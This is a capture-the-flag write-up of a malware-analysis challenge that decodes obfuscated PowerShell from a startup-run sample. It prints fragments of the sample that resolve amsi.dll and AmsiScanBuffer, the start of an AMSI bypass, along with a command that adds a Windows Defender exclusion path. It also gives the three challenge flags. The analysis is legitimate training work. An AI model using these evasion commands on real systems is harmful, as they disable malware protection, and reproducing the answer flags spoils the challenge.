# Spaghetti

| Category   | Author       |
| ---------- | ------------ |
| 🐞 Malware | John Hammond |

> You know, I've been thinking... at the end of the day, spaghetti is really just strings of pasta!
> 
> Anyway, we saw this weird file running on startup. Can you figure out what this is?
> 
> I'm sure you'll get more understanding of the questions below as you explore!

> **CAUTION**
> 
> This is the Malware category, and as such, includes malware. Please be sure to analyze these files within an isolated virtual machine.

> **IMPORTANT**
> 
> The ZIP archive password is `infected`.

> **NOTE**
> 
> You may find a public paste URL that is expired. This is an artifact of the original malware sample and is intentional. This URL is not necessary for the challenge.

## MainFileSettings

> Uncover the flag within the "main file."

> **NOTE**
> 
> Once you uncover the intended payload, you shouldn't need to do any further analysis. Use context clues from the challenge description and you should find the flag.

The spaghetti PowerShell code contains references to the AYGIW.tmp file.
Figure out the decoding it does and print the byte-array.
Then decode it from Decimal (thanks Cyberchef for the hint!)
This will result in a Windows Portable Executable with the flag string inside of it

`flag{39544d3b5374ebf7d39b8c260fc4afd8}`

## My Fourth Oasis

>  Uncover the flag within "my fourth oasis."

Decode `$MyOasis4`

```
$BBWHVWQ = [ZQCUW]::LoadLibrary("$([SYstem.Net.wEBUtIlITy]::HTmldecoDE('&#97;&#109;&#115;&#105;&#46;&#100;&#108;&#108;'))")
$XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#65;&#109;&#115;&#105;&#83;&#99;&#97;&#110;&#66;&#117;&#102;&#102;&#101;&#114;'))")
# $XPYMWR = [ZQCUW]::GetProcAddress($BBWHVWQ, "$([systeM.neT.webUtility]::HtMldECoDE('&#102;&#108;&#97;&#103;&#123;&#98;&#51;&#49;&#51;&#55;&#57;&#52;&#100;&#99;&#101;&#102;&#51;&#51;&#53;&#100;&#97;&#54;&#50;&#48;&#54;&#100;&#53;&#52;&#97;&#102;&#56;&#49;&#98;&#54;&#50;&#48;&#51;&#125;'))")
```

HTML decode those values

```
amsi.dll
AmsiScanBuffer
flag{b313794dcef335da6206d54af81b6203}
```

`flag{b313794dcef335da6206d54af81b6203}`

## MEMEMAN

> Uncover the flag beside "MEMEMAN."

Decode `$TDefo`

```
Add-MpPreference -ExclusionPath  C:\ProgramData\MEMEMAN\
# Add-MpPreference -ExclusionExtension "flag{60814731f508781b9a5f8636c817af9d}"
```

`flag{60814731f508781b9a5f8636c817af9d}`